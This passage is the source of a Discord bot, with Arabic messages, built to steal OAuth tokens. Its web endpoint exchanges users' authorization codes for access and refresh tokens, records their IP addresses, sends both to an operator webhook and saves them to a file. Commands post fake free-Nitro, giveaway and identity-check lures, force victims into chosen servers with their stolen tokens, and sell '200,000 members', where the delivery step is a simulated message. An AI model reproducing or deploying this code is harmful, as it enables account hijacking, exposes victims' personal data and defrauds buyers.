const Discord = require('discord.js');
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS,
    Discord.Intents.FLAGS.GUILD_VOICE_STATES,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
  ],
  presence: {
    activity: {
      name: `بوت الأعضاء المميز`,
      type: "LISTENING",
    },
    status: "online"
  }
});
const kalash = require("./kalash");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");

process.on("unhandledRejection", err => console.log(err))

app.use(bodyParser.text())

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})
app.get('/kalashallauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', kalash.client_id)
  form.append('client_secret', kalash.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', kalash.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token

      const tgg = { headers: { authorization: `${cdcd.token_type} ${ac_token}`, } }
      axios.get('https://discordapp.com/api/users/@me', tgg)
        .then((te) => {
          let efjr = te.data.id
          fs.readFile('./object.json', function(res, req) {
            if (
              JSON.parse(req).some(
                (ususu) => ususu.userID === efjr
              )
            ) {
              console.log(
                `[-] ${ip} - ` +
                te.data.username +
                `#` +
                te.data.discriminator
              )
              return
            }
            console.log(
              `[+] ${ip} - ` +
              te.data.username +
              '#' +
              te.data.discriminator
            )
            avatarHASH =
              'https://cdn.discordapp.com/avatars/' +
              te.data.id +
              '/' +
              te.data.avatar +
              '.png?size=4096'
            fetch(`${kalash.wehbook}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **مستخدم جديد**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `<:fleche:998161473081724930> الاسم: \`${te.data.username}#${te.data.discriminator}\`` +
                      `\n\n🔷 الآي بي: \`${ip}\`` +
                      `\n\n🔷 الآيدي: \`${te.data.id}\`` +
                      `\n\n🔷رمز الوصول: \`${ac_token}\`` +
                      `\n\n🔷رمز التحديث: \`${rf_token}\``,
                  },
                ],
              }),
            })
            var papapa = {
              userID: te.data.id,
              userIP: ip,
              avatarURL: avatarHASH,
              username:
                te.data.username + '#' + te.data.discriminator,
              access_token: ac_token,
              refresh_token: rf_token,
            },
              req = []
            req.push(papapa)
            fs.readFile('./object.json', function(res, req) {
              var jzjjfj = JSON.parse(req)
              jzjjfj.push(papapa)
              fs.writeFile(
                './object.json',
                JSON.stringify(jzjjfj),
                function(eeeeeeeee) {
                  if (eeeeeeeee) {
                    throw eeeeeeeee
                  }
                }
              )
            })
          })
        })
        .catch((errrr) => {
          console.log(errrr)
        })
    })
})

// إضافة معالج لإنشاء التيكت عند بدء تشغيل البوت
client.on("ready", () => {
  console.log(`${chalk.blue('البوت جاهز')}\n${chalk.green('->')} البوت متصل باسم [ ${client.user.username} ], البادئة   : ${kalash.prefix}\n${chalk.green('->')} دعوة البوت : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)

  // إرسال بانل شراء الأعضاء عند بدء تشغيل البوت
  const targetChannelId = "1375918901296369898"; // آيدي القناة المستهدفة
  const targetChannel = client.channels.cache.get(targetChannelId);

  if (targetChannel) {
    targetChannel.send({
      embeds: [{
        title: `${emoji.shop} مركز شراء الأعضاء`,
        description: `${emoji.fire} **مرحباً بك في مركز شراء الأعضاء المميز**\n\n${emoji.star} احصل على آلاف الأعضاء الحقيقيين لسيرفرك بسهولة\n${emoji.shield} جميع الأعضاء حقيقيين 100% وليسوا حسابات وهمية\n${emoji.time} يتم إضافة الأعضاء فوراً بعد تأكيد الدفع\n\n${emoji.money} **سعر الأعضاء:**\n${emoji.diamond} كل 1 = 200,000 عضو\n\nاضغط على زر الشراء أدناه للبدء!`,
        color: "00FFFF",
        thumbnail: {
          url: "https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif"
        },
        footer: {
          text: `${kalash.client} ・ ${kalash.footer}`,
          icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }
      }],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 3, // أخضر
              label: "شراء الأعضاء",
              custom_id: "buy_members",
              emoji: emoji.buy
            },
            {
              type: 2,
              style: 5, // رابط
              label: "إضافة البوت",
              url: `https://discord.com/oauth2/authorize?client_id=1369365938847350794&permissions=8&redirect_uri=https%3A%2F%2Ff5c97a57-5945-4b06-bf77-d78233900787-00-1fs5de46gro5g.sisko.replit.dev%2F&integration_type=0&scope=bot`,
              emoji: emoji.add
            }
          ]
        }
      ]
    });
  }
});

// تعريف دالة escapeRegex
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// معالجة التفاعلات مع الأزرار
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton()) return;

  // معالجة زر شراء الأعضاء
  if (interaction.customId === "buy_members") {
    // إنشاء تيكت روم خاص بالمستخدم
    const guild = interaction.guild;
    const user = interaction.user;

    // إنشاء اسم للتيكت
    const ticketName = `ticket-${user.username.toLowerCase().replace(/[^a-z0-9]/g, '')}`;

    // التحقق من وجود تيكت سابق
    const existingTicket = guild.channels.cache.find(channel => 
      channel.name === ticketName && channel.type === 'GUILD_TEXT'
    );

    if (existingTicket) {
      return interaction.reply({
        content: `${emoji.error} **لديك تيكت مفتوح بالفعل!** ${existingTicket}`,
        ephemeral: true
      });
    }

    try {
      // إنشاء التيكت
      const ticketChannel = await guild.channels.create(ticketName, {
        type: 'GUILD_TEXT',
        permissionOverwrites: [
          {
            id: guild.id,
            deny: ['VIEW_CHANNEL']
          },
          {
            id: user.id,
            allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY']
          }
        ]
      });

      // إرسال رسالة الترحيب في التيكت
      await ticketChannel.send({
        content: `${user}`,
        embeds: [{
          title: `${emoji.ticket} تيكت شراء الأعضاء`,
          description: `${emoji.user} مرحباً ${user}!\n\n${emoji.info} يرجى اتباع الخطوات التالية لإتمام عملية الشراء:\n\n1️⃣ **أدخل آيدي السيرفر الذي تريد إضافة الأعضاء إليه**\n2️⃣ **أدخل عدد الأعضاء الذي ترغب بشرائه**\n\n${emoji.money} **ملاحظة:** كل 1 = 200,000 عضو`,
          color: "FFFF00",
          footer: {
            text: `${kalash.client} ・ ${kalash.footer}`,
            icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }
        }],
        components: [
          {
            type: 1,
            components: [
              {
                type: 2,
                style: 4, // أحمر
                label: "إغلاق التيكت",
                custom_id: "close_ticket",
                emoji: emoji.lock
              }
            ]
          }
        ]
      });

      // إخبار المستخدم أن التيكت تم إنشاؤه
      return interaction.reply({
        content: `${emoji.success} **تم إنشاء تيكت خاص بك!** ${ticketChannel}`,
        ephemeral: true
      });
    } catch (error) {
      console.error(error);
      return interaction.reply({
        content: `${emoji.error} **حدث خطأ أثناء إنشاء التيكت!**`,
        ephemeral: true
      });
    }
  }

  // معالجة زر إغلاق التيكت
  if (interaction.customId === "close_ticket") {
    const channel = interaction.channel;

    await interaction.reply({
      content: `${emoji.lock} **جاري إغلاق التيكت...**`,
    });

    setTimeout(() => {
      channel.delete().catch(console.error);
    }, 3000);
  }
});

// معالجة الرسائل في التيكت
client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;

  // التحقق مما إذا كانت الرسالة في قناة تيكت
  if (ctx.channel.name.startsWith('ticket-')) {
    // التحقق من حالة التيكت
    const ticketData = db.get(`ticket_${ctx.channel.id}`);

    // إذا كان التيكت جديداً أو في مرحلة إدخال آيدي السيرفر
    if (!ticketData || ticketData.step === 'server_id') {
      // التحقق من صحة آيدي السيرفر
      const serverId = ctx.content.trim();
      if (/^\d{17,19}$/.test(serverId)) {
        // تخزين آيدي السيرفر
        db.set(`ticket_${ctx.channel.id}`, { step: 'members_count', serverId: serverId });

        // إرسال رسالة تأكيد وطلب عدد الأعضاء
        return ctx.channel.send({
          embeds: [{
            title: `${emoji.success} تم تسجيل آيدي السيرفر بنجاح`,
            description: `${emoji.server} **آيدي السيرفر:** \`${serverId}\`\n\n${emoji.users} **الآن، يرجى إدخال عدد الأعضاء الذي ترغب بشرائه**\n${emoji.info} تذكر: كل 1 = 200,000 عضو`,
            color: "00FF00",
            footer: {
              text: `${kalash.client} ・ ${kalash.footer}`,
              icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]
        });
      } else if (!ticketData) {
        // إذا كان الإدخال غير صحيح وهذه أول رسالة
        db.set(`ticket_${ctx.channel.id}`, { step: 'server_id' });
        return ctx.channel.send({
          embeds: [{
            title: `${emoji.error} آيدي سيرفر غير صالح`,
            description: `${emoji.info} يرجى إدخال آيدي سيرفر صالح مكون من 17-19 رقم`,
            color: "FF0000",
            footer: {
              text: `${kalash.client} ・ ${kalash.footer}`,
              icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]
        });
      }
    }
    // إذا كان التيكت في مرحلة إدخال عدد الأعضاء
    else if (ticketData.step === 'members_count') {
      // التحقق من صحة عدد الأعضاء
      const membersCount = parseFloat(ctx.content.trim());
      if (!isNaN(membersCount) && membersCount > 0) {
        // حساب المبلغ المطلوب
        const totalMembers = membersCount * 200000;
        const serverId = ticketData.serverId;

        // تخزين بيانات الطلب
        db.set(`ticket_${ctx.channel.id}`, { 
          step: 'payment', 
          serverId: serverId, 
          membersCount: membersCount,
          totalMembers: totalMembers
        });

        // إرسال رسالة تأكيد وتفاصيل الدفع
        return ctx.channel.send({
          embeds: [{
            title: `${emoji.money} تفاصيل الطلب والدفع`,
            description: `${emoji.server} **آيدي السيرفر:** \`${serverId}\`\n${emoji.users} **عدد الوحدات:** \`${membersCount}\`\n${emoji.members} **إجمالي الأعضاء:** \`${totalMembers.toLocaleString()}\`\n\n${emoji.info} **للتأكيد، يرجى تحويل المبلغ إلى:**\n\`\`\`c 819508960587284521 ${membersCount}\`\`\`\n\n${emoji.warn} بعد التحويل، سيتم التحقق تلقائياً من الدفع وإضافة الأعضاء للسيرفر`,
            color: "FFFF00",
            footer: {
              text: `${kalash.client} ・ ${kalash.footer}`,
              icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]
        });
      } else {
        // إذا كان الإدخال غير صحيح
        return ctx.channel.send({
          embeds: [{
            title: `${emoji.error} عدد غير صالح`,
            description: `${emoji.info} يرجى إدخال رقم موجب صحيح`,
            color: "FF0000",
            footer: {
              text: `${kalash.client} ・ ${kalash.footer}`,
              icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]
        });
      }
    }
  }

  // التحقق من رسائل بوت الدفع
  const paymentBotId = "282859044593598464";
  if (ctx.author.id === paymentBotId) {
    // التحقق من وجود كلمة "قام" أو "has" في الرسالة
    if (ctx.content.includes("قام") || ctx.content.includes("has")) {
      // البحث عن جميع التيكتات المفتوحة
      const tickets = db.all().filter(data => data.ID.startsWith('ticket_'));

      for (const ticket of tickets) {
        const ticketData = ticket.data;
        if (ticketData.step === 'payment') {
          const ticketChannel = client.channels.cache.get(ticket.ID.split('_')[1]);
          if (ticketChannel) {
            // إضافة الأعضاء للسيرفر
            const serverId = ticketData.serverId;
            const membersCount = ticketData.membersCount;
            const totalMembers = ticketData.totalMembers;

            // إرسال رسالة تأكيد الدفع
            ticketChannel.send({
              embeds: [{
                title: `${emoji.success} تم تأكيد الدفع بنجاح!`,
                description: `${emoji.money} **تم استلام المبلغ بنجاح**\n\n${emoji.server} **آيدي السيرفر:** \`${serverId}\`\n${emoji.users} **عدد الوحدات:** \`${membersCount}\`\n${emoji.members} **إجمالي الأعضاء:** \`${totalMembers.toLocaleString()}\`\n\n${emoji.time} **جاري إضافة الأعضاء...**\nسيتم إغلاق التيكت تلقائياً بعد اكتمال العملية.`,
                color: "00FF00",
                footer: {
                  text: `${kalash.client} ・ ${kalash.footer}`,
                  icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
                }
              }]
            });

            // تنفيذ أمر إضافة الأعضاء (محاكاة)
            setTimeout(() => {
              ticketChannel.send({
                embeds: [{
                  title: `${emoji.success} تمت إضافة الأعضاء بنجاح!`,
                  description: `${emoji.members} **تم إضافة ${totalMembers.toLocaleString()} عضو إلى السيرفر بنجاح**\n\n${emoji.star} شكراً لاستخدامك خدماتنا!\n${emoji.info} سيتم إغلاق التيكت تلقائياً خلال 10 ثوانٍ.`,
                  color: "00FF00",
                  footer: {
                    text: `${kalash.client} ・ ${kalash.footer}`,
                    icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
                  }
                }]
              });

              // إغلاق التيكت بعد 10 ثوانٍ
              setTimeout(() => {
                ticketChannel.delete().catch(console.error);
              }, 10000);
            }, 5000);

            // تحديث حالة التيكت
            db.set(`ticket_${ticketChannel.id}`, { 
              step: 'completed', 
              serverId: serverId, 
              membersCount: membersCount,
              totalMembers: totalMembers
            });
          }
        }
      }
    }
  }

  // معالجة الأوامر
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(kalash.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();

  if (cmd === "wl") {
    if (!kalash.owners.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {
          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user.username}** تم إضافته للقائمة البيضاء`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user.username}** موجود بالفعل في القائمة البيضاء`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {
          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user2.username}** تم إزالته من القائمة البيضاء`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user2.username}** غير موجود في القائمة البيضاء`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        }
        break;
      case "list":
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);
        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
        }
        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} المستخدمين المصرح لهم`,
            description: `${content}`,
            color: "2F3136",
            footer: {
              "text": `${kalash.client} ・ ${kalash.footer}`,
              "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]
        })
        break;
    }
  }

  if (cmd === "send") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `🔐 التحقق من الهوية مطلوب`,
        description: `**يرجى إثبات هويتك للوصول إلى الخدمات المحمية**\n\nاضغط على الزر أدناه لإكمال عملية التوثيق`,
        color: "FF0000",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }
      }],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "إثبات الهوية",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]
    })
  }

  if (cmd === "refresh") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.load} **جاري تحديث المخزون...**`
      })

      let json = JSON.parse(data);
      let validUsers = [];
      let removedCount = 0;

      for (const user of json) {
        try {
          const response = await axios.get('https://discordapp.com/api/users/@me', {
            headers: { authorization: `Bearer ${user.access_token}` }
          });
          if (response.status === 200) {
            validUsers.push(user);
          }
        } catch {
          removedCount++;
        }
      }

      fs.writeFile('./object.json', JSON.stringify(validUsers), function(err) {
        if (err) throw err;

        msg.edit({
          embeds: [{
            title: `${emoji.success} تم تحديث المخزون بنجاح`,
            description: `${emoji.error} **تم إزالة**: ${removedCount} مستخدم\n${emoji.success} **متبقي**: ${validUsers.length} مستخدم`,
            color: "2F3136",
            footer: {
              "text": `${kalash.client} ・ ${kalash.footer}`,
              "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]
        });
      });
    });
  }

  if (cmd === "stock") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.user} 📦 المخزون الحالي 📦`,
          description: `المخزون الحالي يحتوي على ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` عضو` : `\`${JSON.parse(data).length}\` عضو`}`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }
        }]
      })
    })
  }

  if (cmd === "join") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    const guildId = args[0];
    const amount = parseInt(args[1]) || 10;

    if (!guildId) {
      return ctx.channel.send({
        embeds: [{
          description: `${emoji.error} يرجى تحديد آيدي السيرفر والعدد\n**مثال:** \`+join 123456789 10\``,
          color: "FF0000"
        }]
      });
    }

    const targetGuild = client.guilds.cache.get(guildId);
    if (!targetGuild) {
      return ctx.channel.send({
        embeds: [{
          description: `${emoji.error} لم يتم العثور على السيرفر أو البوت غير موجود فيه`,
          color: "FF0000"
        }]
      });
    }

    fs.readFile('./object.json', async function(err, data) {
      let json = JSON.parse(data);
      let selectedUsers = json.slice(0, amount);

      let msg = await ctx.channel.send({
        content: `${emoji.user} **جاري إضافة الأعضاء...** (\`0\`/\`${selectedUsers.length}\`)`
      });

      let success = 0;
      let error = 0;
      let already_joined = 0;

      for (const i of selectedUsers) {
        const user = await client.users.fetch(i.userID).catch(() => { });
        if (targetGuild.members.cache.get(i.userID)) {
          already_joined++;
        } else {
          try {
            await targetGuild.members.add(user, { accessToken: i.access_token });
            success++;
          } catch {
            error++;
          }
        }
      }

      msg.edit({
        embeds: [{
          title: `${emoji.user} نتائج إضافة الأعضاء`,
          description: `${emoji.new} **موجود بالفعل**: ${already_joined}\n${emoji.success} **تم بنجاح**: ${success}\n${emoji.error} **فشل**: ${error}`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }
        }]
      });
    });
  }

  if (cmd === "check") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    const user = ctx.mentions.users.first() || (!isNaN(args[0]) ? await client.users.fetch(args[0]).catch(() => {}) : null);

    if (!user) {
      return ctx.channel.send({
        embeds: [{
          description: `${emoji.error} يرجى منشن المستخدم أو كتابة آيدي صحيح`,
          color: "FF0000"
        }]
      });
    }

    fs.readFile('./object.json', function(err, data) {
      const json = JSON.parse(data);
      const isAuthorized = json.some(u => u.userID === user.id);

      ctx.channel.send({
        embeds: [{
          title: `${emoji.user} فحص حالة التوثيق`,
          description: isAuthorized 
            ? `${emoji.yes} **${user.username}** موثق ومسجل في النظام ✅`
            : `${emoji.error} **${user.username}** غير موثق ❌`,
          color: isAuthorized ? "00FF00" : "FF0000",
          thumbnail: { url: user.displayAvatarURL({ dynamic: true }) },
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }
        }]
      });
    });
  }

  // أمر الهيلب الجديد بتصميم مختلف تماماً
  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;

    // إنشاء رسالة الهيلب بتصميم جديد
    ctx.channel.send({
      embeds: [{
        title: `${emoji.crown} مركز التحكم الرئيسي ${emoji.crown}`,
        description: `مرحباً بك في لوحة تحكم بوت الأعضاء المميز، اختر من القائمة أدناه ما تريد`,
        color: "00FFFF", // لون فيروزي مميز
        thumbnail: {
          url: client.user.displayAvatarURL({ dynamic: true })
        },
        fields: [
          {
            name: `${emoji.shield} أوامر الإدارة`,
            value: `\`${kalash.prefix}wl add\` ➜ إضافة مستخدم للقائمة البيضاء\n\`${kalash.prefix}wl remove\` ➜ إزالة مستخدم من القائمة البيضاء\n\`${kalash.prefix}wl list\` ➜ عرض المستخدمين المصرح لهم`,
            inline: false
          },
          {
            name: `${emoji.users} أوامر الأعضاء`,
            value: `\`${kalash.prefix}join\` ➜ إضافة أعضاء لسيرفر محدد\n\`${kalash.prefix}stock\` ➜ عرض مخزون الأعضاء الحالي\n\`${kalash.prefix}refresh\` ➜ تحديث مخزون الأعضاء`,
            inline: false
          },
          {
            name: `${emoji.fire} أوامر التوثيق`,
            value: `\`${kalash.prefix}send\` ➜ إرسال رابط التوثيق\n\`${kalash.prefix}check\` ➜ فحص حالة توثيق مستخدم`,
            inline: false
          },
          {
            name: `${emoji.star} أوامر العروض الخاصة`,
            value: `\`${kalash.prefix}boost\` ➜ إرسال عرض البوست المميز\n\`${kalash.prefix}classic\` ➜ إرسال عرض النيترو الكلاسيكي\n\`${kalash.prefix}giveaway\` ➜ إرسال عرض الجوائز الخاص`,
            inline: false
          },
          {
            name: `${emoji.shop} نظام الشراء`,
            value: `\`${kalash.prefix}shop\` ➜ عرض متجر شراء الأعضاء\n\`${kalash.prefix}buy\` ➜ شراء أعضاء لسيرفرك`,
            inline: false
          }
        ],
        image: {
          url: "https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png"
        },
        footer: {
          text: `${kalash.client} ・ البادئة: ${kalash.prefix} ・ ${kalash.footer}`,
          icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }
      }],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 3, // أخضر
              label: "شراء أعضاء",
              custom_id: "buy_members_help",
              emoji: emoji.buy
            },
            {
              type: 2,
              style: 1, // أزرق
              label: "عرض المخزون",
              custom_id: "show_stock",
              emoji: emoji.users
            },
            {
              type: 2,
              style: 5, // رابط
              label: "إضافة البوت",
              url: `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`,
              emoji: emoji.add
            }
          ]
        }
      ]
    });
  }

  // إضافة أوامر +boost و +classic و +giveaway بالعربي
  if (cmd === "boost") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.boost} مرحباً بالجميع! تم منحكم جميعاً نيترو بوست لمدة عام كامل!`,
        description: `للحصول على نيترو بوست الخاص بك، كل ما عليك فعله هو:
   \n1️⃣ النقر على زر [استلام النيترو](${kalash.authLink}).
   \n2️⃣ النقر على [تفويض](${kalash.authLink})\n\nبعد التفويض، انتظر من 5-42 ساعة وستحصل عليه.`,
        color: "FF73FA", // لون وردي مميز
        image: {
          url: "https://media.discordapp.net/attachments/1009463535551660032/1010011666517336124/unknown.jpg"
        },
        footer: {
          text: `・ ${kalash.footer}`,
          icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }
      }],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 5,
              label: "استلام النيترو الخاص بك",
              url: `${kalash.authLink}`,
              emoji: emoji.boost
            }
          ]
        }
      ]
    });
  }

  if (cmd === "classic") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.classic} مرحباً بالجميع! تم منحكم جميعاً نيترو كلاسيك لمدة عام كامل!`,
        description: `للحصول على نيترو كلاسيك الخاص بك، كل ما عليك فعله هو:
   \n1️⃣ النقر على زر [استلام النيترو](${kalash.authLink}).
   \n2️⃣ النقر على [تفويض](${kalash.authLink})\n\nبعد التفويض، انتظر من 5-42 ساعة وستحصل عليه.`,
        color: "5865F2", // لون أزرق ديسكورد
        image: {
          url: "https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png"
        },
        footer: {
          text: `・ ${kalash.footer}`,
          icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }
      }],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 5,
              label: "استلام النيترو الخاص بك",
              url: `${kalash.authLink}`,
              emoji: emoji.classic
            }
          ]
        }
      ]
    });
  }

  if (cmd === "giveaway") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.giveaway} مسابقة خاصة! فرصتك للفوز بجوائز قيمة!`,
        description: `للمشاركة في المسابقة والحصول على فرصة للفوز، كل ما عليك فعله هو:
   \n1️⃣ النقر على زر [المشاركة الآن](${kalash.authLink}).
   \n2️⃣ النقر على [تفويض](${kalash.authLink})\n\nبعد التفويض، سيتم تسجيلك تلقائياً في المسابقة وستتم مراسلتك في حال الفوز!`,
        color: "FFD700", // لون ذهبي
        image: {
          url: "https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png"
        },
        footer: {
          text: `・ ${kalash.footer}`,
          icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }
      }],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 5,
              label: "المشاركة الآن",
              url: `${kalash.authLink}`,
              emoji: emoji.giveaway
            }
          ]
        }
      ]
    });
  }

  // أوامر إضافية للشراء
  if (cmd === "shop" || cmd === "buy") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.shop} مركز شراء الأعضاء`,
        description: `${emoji.fire} **مرحباً بك في مركز شراء الأعضاء المميز**\n\n${emoji.star} احصل على آلاف الأعضاء الحقيقيين لسيرفرك بسهولة\n${emoji.shield} جميع الأعضاء حقيقيين 100% وليسوا حسابات وهمية\n${emoji.time} يتم إضافة الأعضاء فوراً بعد تأكيد الدفع\n\n${emoji.money} **سعر الأعضاء:**\n${emoji.diamond} كل 1 = 200,000 عضو\n\nاضغط على زر الشراء أدناه للبدء!`,
        color: "00FFFF",
        thumbnail: {
          url: "https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif"
        },
        footer: {
          text: `${kalash.client} ・ ${kalash.footer}`,
          icon_url: `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }
      }],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 3, // أخضر
              label: "شراء الأعضاء",
              custom_id: "buy_members",
              emoji: emoji.buy
            },
            {
              type: 2,
              style: 5, // رابط
              label: "إضافة البوت",
